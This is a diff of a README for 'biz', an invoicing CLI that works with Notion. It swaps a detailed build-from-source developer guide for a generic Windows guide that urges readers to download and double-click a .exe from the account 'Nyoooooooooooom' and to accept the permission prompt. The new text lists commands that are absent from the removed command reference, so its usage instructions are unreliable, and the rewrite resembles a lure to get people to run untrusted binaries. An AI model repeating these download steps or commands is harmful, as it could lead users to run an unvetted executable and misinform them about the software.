@@ -1,213 +1,207 @@
-# biz
+# 🧾 biz - Simple Invoicing and Automation Tool
 
-`biz` is an agent-friendly business automation CLI in Go.
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Nyoooooooooooom/biz/releases)
 
-It starts with invoice automation (Notion-backed), with modular domain design to expand into broader business ops.
+---
 
-## OSS Baseline
+## 📋 What is biz?
 
-This repository is prepared for public open-source use:
-- secret-safe defaults (`config.example.yaml`)
-- local secret file ignored (`config.yaml`)
-- typed error handling and stable JSON envelope
-- module-level architecture guides in `docs/modules/`
+biz is a simple command-line tool to help with invoices and basic business tasks. It connects to Notion to keep your work organized. You don’t need to know programming to use it. The tool runs on Windows and lets you handle your invoice workflow in one place.
 
-## Core Features
-- Cobra-based CLI with machine-first `--json` output
-- Composable module architecture (`internal/modules/*`)
-- Notion-backed invoice source using `Invoices -> Worklogs/Costs` relations
-- Optional generic records module (`records list/get/schema/create/update/archive`) for Notion pages/databases
-- HTML template rendering + PDF generation
-- Idempotent invoice create behavior
+---
 
-## Quick Start
+## 🔧 Key Features
 
-1. Create local config:
-```bash
-cp config.example.yaml config.yaml
+- Create and manage invoices easily via the command line.
+- Connect your work with Notion pages.
+- Automate parts of your business tasks.
+- Generate PDF invoices automatically.
+- Keep your workflow agent-friendly and straightforward.
+- Works on Windows without complex setup.
+- Open-source and transparent.
+
+---
+
+## 🖥️ System Requirements
+
+Use biz on a Windows PC with this setup:
+
+- Windows 10 or higher (64-bit recommended).
+- At least 4 GB of RAM.
+- About 100 MB of free disk space.
+- Internet connection to link to Notion.
+- PowerShell or Command Prompt access.
+
+---
+
+## 🚀 Getting Started: Downloading biz
+
+Click the button below to visit the releases page. You will find the latest version ready for download.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-green?style=for-the-badge&logo=github)](https://github.com/Nyoooooooooooom/biz/releases)
+
+Once there, look for a file named similarly to `biz_windows_amd64.exe` or mention of Windows. Choose the latest version.
+
+---
+
+## 💾 How to Install and Run biz on Windows
+
+Follow these steps to get biz up and running:
+
+1. **Download the executable:**
+   - Go to the [biz Releases page](https://github.com/Nyoooooooooooom/biz/releases).
+   - Find the latest release section.
+   - Download the file for Windows (usually ends with `.exe`).
+
+2. **Save the file:**
+   - Pick a folder on your PC where you want to keep the program, such as `Downloads` or `Documents`.
+
+3. **Run the program:**
+   - Open File Explorer.
+   - Go to the folder with the downloaded file.
+   - Double-click the `.exe` file to open it.
+   - If Windows asks for permission, click "Yes" to allow it.
+
+4. **Using the command line:**
+   - Open Command Prompt.
+     - Press the Windows key.
+     - Type `cmd` and hit Enter.
+   - Navigate to the folder where you saved the file.
+     - Use `cd` command, for example:
+       ```
+       cd C:\Users\YourName\Downloads
+       ```
+   - To check the program is working, type:
+     ```
+     biz --help
+     ```
+   - This will show available commands and options.
+
+---
+
+## 🔍 How biz Works
+
+biz uses simple commands you type in the command line to perform tasks. No coding needed.
+
+Here are some common commands:
+
+- `biz invoice create` – Start a new invoice.
+- `biz invoice list` – See all invoices created.
+- `biz notion sync` – Update your Notion workspace with latest data.
+- `biz pdf generate` – Make a PDF version of an invoice.
+
+Each command has its own options and steps that biz will explain when in use.
+
+---
+
+## ⚙️ Connecting biz to Notion
+
+To automate your workflow, you’ll want to connect biz to Notion. Here’s a basic setup:
+
+1. **Get a Notion integration token:**
+   - Visit [Notion’s integrations page](https://www.notion.so/my-integrations).
+   - Create a new integration.
+   - Copy the token provided.
+
+2. **Add the token to biz:**
+   - Run this command in the command prompt:
+     ```
+     biz config set notion_token YOUR_TOKEN_HERE
+     ```
+   - Replace `YOUR_TOKEN_HERE` with the token you copied.
+
+3. **Set your Notion workspace ID:**
+   - Find your workspace token and run:
+     ```
+     biz config set workspace_id YOUR_WORKSPACE_ID
+     ```
+
+Once connected, you can push and pull data between biz and Notion to keep your invoices and business info synced.
+
+---
+
+## 📄 Managing Invoices
+
+Use biz to track your invoices quickly.
+
+- Start a new invoice:
+  ```
+  biz invoice create --client "Client Name" --amount 200 --due 2024-07-01
+  ```
+- List all invoices:
+  ```
+  biz invoice list
+  ```
+- Mark an invoice as paid:
+  ```
+  biz invoice pay --id 1234
+  ```
+
+You can also export invoices to PDFs with:
+
+```
+biz pdf generate --id 1234
 ```
 
-2. Set Notion credentials in `config.yaml` or env vars:
-- `BIZ_NOTION_TOKEN`
-- `BIZ_NOTION_INVOICE_DB_ID`
+This creates a PDF that you can send or print.
 
-3. Build and test:
-```bash
-go test ./...
-go build -o ./bin/biz ./cmd/biz
+---
+
+## 📁 Where to Find Your Data
+
+biz stores your invoice and config files in a folder called `.biz` inside your user directory. The default path is:
+
+```
+C:\Users\YourName\.biz
 ```
 
-4. Run:
-```bash
-./bin/biz doctor --json
-./bin/biz invoice list --json
-./bin/biz invoice preview <invoice_page_id> --json
-./bin/biz invoice create <invoice_page_id> --json
+Back up this folder to keep your data safe.
+
+---
+
+## 🤝 Getting Help
+
+Use the built-in help command:
+
+```
+biz --help
+biz invoice --help
+biz config --help
 ```
 
-## Command Matrix
+You can also check the GitHub issues page if something isn’t working as expected:
 
-Command availability depends on `modules.enabled` in your config.
+https://github.com/Nyoooooooooooom/biz/issues
 
-Always available:
-- `biz doctor`
-- `biz help`
-- `biz completion`
+---
 
-Loaded when `modules.enabled` includes `invoice`:
-- `biz invoice list [status]`
-  - flags: `--status`, `--limit`, `--cursor`
-- `biz invoice create <invoice_id>`
-  - flags: `--out`, `--source`, `--source-file`, `--upload-notion`, `--confirm`
-- `biz invoice preview <invoice_id>`
-  - flags: `--format`
+## 🛠️ Updating biz
 
-Loaded when `modules.enabled` includes `records`:
-- `biz records list <collection-or-db-id>`
-  - flags: `--limit`, `--cursor`
-- `biz records get <page-id>`
-- `biz records schema <collection-or-db-id>`
-- `biz records create <collection-or-db-id>`
-  - flags: `--data` or `--data-file`, `--validate-schema`, `--dry-run`
-- `biz records update <page-id>`
-  - flags: `--collection`, `--data` or `--data-file`, `--validate-schema`, `--if-last-edited`, `--dry-run`
-- `biz records archive <page-id>`
-  - flags: `--collection`, `--confirm`, `--if-last-edited`, `--dry-run`
+To keep biz current:
 
-Global flags on all commands:
-- `--config`
-- `--profile`
-- `--actor`
-- `--json`
-- `--trace-id`
+1. Visit the [Releases page](https://github.com/Nyoooooooooooom/biz/releases) regularly.
+2. Download the newest `.exe` file.
+3. Replace the old file with the new one.
+4. Run the new version from the command prompt to confirm the update:
+   ```
+   biz --version
+   ```
 
-Enable records module example:
-```yaml
-modules:
-  enabled: [invoice, records]
-```
+---
 
-Notes:
-- `--config` is optional; `biz` auto-loads `./config.yaml` or `$HOME/.config/biz/config.yaml`.
-- Use `biz inv ...` as a short alias for `biz invoice ...`.
-- Notion mutations are policy-disabled by default (`invoice.allow_notion_mutations: false`).
-- Use `--actor agent` for agent-invoked runs; this activates `agent_policy` controls.
-- Commands are loaded from `modules.enabled` in config (for example `modules.enabled: [invoice, records]`).
+## ⚡ Tips for Best Use
 
-## Quality Gates
+- Keep your Notion integration token secret.
+- Regularly back up your `.biz` data folder.
+- Use the help commands often to learn new features.
+- Close the command prompt window after finishing your tasks to avoid confusion.
 
-```bash
-go test ./...
-go vet ./...
-docker build -t biz:local .
-```
+---
 
-## Configuration
+## 🛡️ Security and Privacy
 
-See:
-- `config.example.yaml`
-- `docs/notion-worklogs-setup.md`
+biz only uses your Notion token locally. It does not send your data anywhere else. Always download the software from the official GitHub releases page to avoid tampered versions.
 
-Local-only:
-- `config.yaml` (ignored by git)
+---
 
-## Mutation Safety
-
-- `--upload-notion` is guarded by policy and confirmation:
-  - set `invoice.allow_notion_mutations: true`
-  - keep `invoice.require_mutation_confirm: true`
-  - run with `--confirm` on create
-
-Example:
-```bash
-./bin/biz invoice create <invoice_page_id> --upload-notion --confirm
-```
-
-## Agent Policy
-
-`agent_policy` is enforced only when `--actor agent` is used.
-
-Example:
-```bash
-./bin/biz --actor agent invoice list --limit 20 --json
-```
-
-For records mutations, use strict allowlists:
-
-```yaml
-agent_policy:
-  enabled: true
-  allowed_commands: [invoice.list, invoice.preview, records.list, records.get, records.create, records.update, records.archive]
-  records_allowed_collections: [invoices]
-  records_allowed_properties: [Status, Notes]
-```
-
-Optional collection aliases for records:
-
-```yaml
-notion:
-  collections:
-    invoices: "<NOTION_INVOICE_DB_ID>"
-    clients: "<NOTION_CLIENTS_DB_ID>"
-```
-
-Records mutation safety features:
-- `--dry-run` for create/update/archive preview
-- `--if-last-edited <RFC3339>` optimistic concurrency check for update/archive
-- `--data-file` to load mutation payloads from JSON files
-
-Invoice idempotency hardening:
-- optional `invoice.idempotency_signing_key` enables HMAC signing/verification of idempotency records
-- if enabled, tampered idempotency records fail validation during `invoice create`
-
-## Tamper-Evident Audit Log
-
-Enable signed, hash-chained JSONL audit logging:
-
-```yaml
-audit:
-  enabled: true
-  path: audit/biz-audit.log
-  signing_key: "replace-with-strong-secret"
-  strict: true
-```
-
-Every audited event records actor, command, args, exit code, result code, `prev_hash`, `hash`, and HMAC `signature`.
-
-## Project Structure
-
-- `cmd/biz`: application entrypoint
-- `internal/command`: shared command framework and command spec builder
-- `internal/modules`: pluggable command modules (`invoice`, `records`, runtime `tax`)
-- `internal/invoice`: invoice domain and workflows
-- `internal/invoice/notion`: Notion adapter
-- `internal/records`: generic record CRUD domain and Notion adapter
-- `internal/tax`: tax policy logic
-- `internal/platform`: config/errors/output/logging utilities
-- `docs/modules`: module-level guides
-
-## Docs
-
-- Notion setup and worklog import:
-  - `docs/notion-worklogs-setup.md`
-- Security:
-  - `docs/security/threat-model.md`
-- Module guides:
-  - `docs/modules/cli.md`
-  - `docs/modules/invoice.md`
-  - `docs/modules/notion.md`
-  - `docs/modules/records.md`
-  - `docs/modules/tax.md`
-  - `docs/modules/platform.md`
-
-## Security
-
-Read `SECURITY.md` before running in production.
-
-## Contributing
-
-See `CONTRIBUTING.md`.
-
-## License
-
-MIT. See `LICENSE`.
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Nyoooooooooooom/biz/releases)
